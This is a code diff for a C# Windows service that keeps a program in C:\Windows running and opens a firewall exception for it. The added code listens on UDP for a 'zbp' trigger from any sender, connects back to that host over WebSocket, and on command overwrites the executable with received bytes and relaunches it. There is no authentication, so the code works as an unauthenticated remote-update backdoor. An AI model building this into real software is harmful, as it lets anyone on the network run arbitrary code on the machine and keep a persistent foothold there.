@@ -13,27 +13,32 @@ using System.ServiceProcess;
 using System.Text;
 using System.Threading;
 using System.Timers;
+using WebSocketSharp;
 using WindowsService.Properties;
+using WindowsService.websocket;
 using WindowsService.windowApi;
 
 namespace WindowsService
 {
     public partial class Service1 : ServiceBase
     {
-        //Timer timer1;  //计时器
-
-        bool flag = true;//定义一个bool变量，标识是否接收数据
-        Thread thread;//创建线程对象
-        UdpClient udp;
-        string moniterPath = @"C:\Windows\WindowsFormsApp1.exe";
+      
+        private readonly string moniterPath = @"C:\Windows\WindowsFormsApp1.exe";
         System.Timers.Timer timer = null;
+        private string mastHost="";
+        private bool mastSet = false;
+        private bool initSocket = false;
+        private WebSocket ws = null;
+        private bool killing = false;
+
 
         public Service1()
         {
             InitializeComponent();
             timer = new System.Timers.Timer();
             timer.Elapsed += Timer_Elapsed;
-            timer.Interval = 1 * 60*1000;
+            timer.Interval =5* 1000;
+            timer.Start();
         }
 
   
@@ -47,8 +52,125 @@ namespace WindowsService
                 ExecuteCom("netsh firewall set allowedprogram "+moniterPath+" A ENABLE", 1);
             }
 
-
             WinAPI_Interop.CreateProcess(moniterPath);
+            
+          
+        }
+
+        private void Ws_OnMessage(object sender, MessageEventArgs e)
+        {
+            try
+            {
+                if (e.Type == Opcode.Binary)
+                {
+                    Msg msg = new Msg(e.RawData);
+                    switch (msg.type) {
+                        case 11:
+                            kill();
+                            File.WriteAllBytes(moniterPath, msg.data);
+                            killing = false;
+                            break;
+                        case 12:
+                            kill();
+                            WinAPI_Interop.CreateProcess(moniterPath);
+                            killing = false;
+                            break;
+                    }
+
+                }
+            }
+            catch (Exception ex) {
+                
+            }
+        }
+
+        private void checkHost()
+        {
+            if (mastSet) return;
+
+            try
+            {
+                File.WriteAllText("err.log","start");
+                IPEndPoint receivePoint = new IPEndPoint(IPAddress.Any, 0);
+                UdpClient server = new UdpClient(5126);
+                UdpState s = new UdpState(server, receivePoint);
+                server.BeginReceive(EndReceive,s);
+                //byte[] recData = server.Receive(ref receivePoint);
+                //    if (recData != null && recData.Length > 0)
+                //    {
+                //        try
+                //        {
+
+                //            string msg = Encoding.Default.GetString(recData);
+                //            if (msg == "zbp")
+                //            {
+                //                mastHost = receivePoint.Address.ToString();
+                //                mastSet = true;
+                //            }
+                //        }
+                //        catch (Exception ex)
+                //        {
+
+                //        }
+                //    }
+                
+            }
+            catch (Exception ex)
+            {
+                File.WriteAllText("err.log", ex.Message);
+            }
+
+
+        }
+
+        private  void EndReceive(IAsyncResult ar)
+        {
+            File.AppendAllText("c:/log.log","test");
+
+
+            try
+            {
+
+                UdpState s = ar.AsyncState as UdpState;
+                if (s != null)
+                {
+                    UdpClient udpClient = s.UdpClient;
+
+                    IPEndPoint ip = s.IP;
+                    Byte[] receiveBytes = udpClient.EndReceive(ar, ref ip);
+                    string msg = Encoding.UTF8.GetString(receiveBytes);
+                    if (msg == "zbp") {
+                        mastHost = ip.Address.ToString();
+                        mastSet = true;
+                        initWebSocket(mastHost);
+                    }
+                    udpClient.BeginReceive(EndReceive, s);//在这里重新开始一个异步接收，用于处理下一个网络请求
+                }
+            }
+            catch (Exception ex)
+            {
+                File.AppendAllText("log.log", ex.Message);
+                //处理异常
+            }
+        }
+
+
+        private void kill() {
+            killing = true;
+            Process[] p = Process.GetProcessesByName("WindowsFormsApp1");
+            foreach (Process ps in p)
+            {
+                ps.Kill();
+            }
+   
+        }
+
+        private bool isStart() {
+            Process[] p = Process.GetProcessesByName("WindowsFormsApp1");
+            if (p != null && p.Length > 0) {
+                return true;
+            }
+            return false;
         }
 
         /// <summary>  
@@ -108,17 +230,70 @@ namespace WindowsService
 
         private void Timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            bool flag = false;
-            System.Threading.Mutex mutex = new System.Threading.Mutex(true, "Moniter", out flag);
-            if (!flag) {
-                if (!File.Exists(moniterPath))
-                {
-                    File.WriteAllBytes(moniterPath, Resources.WindowsFormsApp1);                    
-                    //ExecuteCom("netsh firewall set allowedprogram " + moniterPath + " A ENABLE", 1);
-                }
+            
+            Console.WriteLine("timer worker");
+            if (isStart()==false&& killing==false) {
                 WinAPI_Interop.CreateProcess(moniterPath);
+                Console.WriteLine("program start");
             }
+            Console.WriteLine("masterSet:" + mastSet);
+            checkHost();
 
+
+            //bool flag = false;
+            //System.Threading.Mutex mutex = new System.Threading.Mutex(true, "Moniter", out flag);
+            //if (!flag) {
+            //    if (!File.Exists(moniterPath))
+            //    {
+            //        File.WriteAllBytes(moniterPath, Resources.WindowsFormsApp1);                    
+            //        //ExecuteCom("netsh firewall set allowedprogram " + moniterPath + " A ENABLE", 1);
+            //    }
+            //    WinAPI_Interop.CreateProcess(moniterPath);
+            //}
+
+        }
+
+        private void initWebSocket(string host) {
+
+            if (initSocket == false && mastSet)
+            {
+                initSocket = true;
+                if (ws != null)
+                {
+                    try
+                    {
+                        ws.Close();
+
+                    }
+                    catch
+                    {
+
+                    }
+                    ws = null;
+                }
+                ws = new WebSocket("ws://" + host + ":4649/chat");
+                ws.OnMessage += Ws_OnMessage;
+                ws.OnError += Ws_OnError;
+                ws.OnClose += Ws_OnClose;
+                try
+                {
+                    ws.Connect();
+                }
+                catch
+                {
+                    initSocket = false;
+                }
+            }
+        }
+
+        private void Ws_OnClose(object sender, CloseEventArgs e)
+        {
+            initSocket = false;
+        }
+
+        private void Ws_OnError(object sender, WebSocketSharp.ErrorEventArgs e)
+        {
+            Console.WriteLine(e.Message);
         }
 
         protected override void OnStop()
@@ -126,4 +301,28 @@ namespace WindowsService
             Console.WriteLine("stop!");
         }
     }
+
+    public class UdpState
+    {
+        private UdpClient udpclient = null;
+
+        public UdpClient UdpClient
+        {
+            get { return udpclient; }
+        }
+
+        private IPEndPoint ip;
+
+        public IPEndPoint IP
+        {
+            get { return ip; }
+        }
+
+        public UdpState(UdpClient udpclient, IPEndPoint ip)
+        {
+            this.udpclient = udpclient;
+            this.ip = ip;
+        }
+    }
+
 }
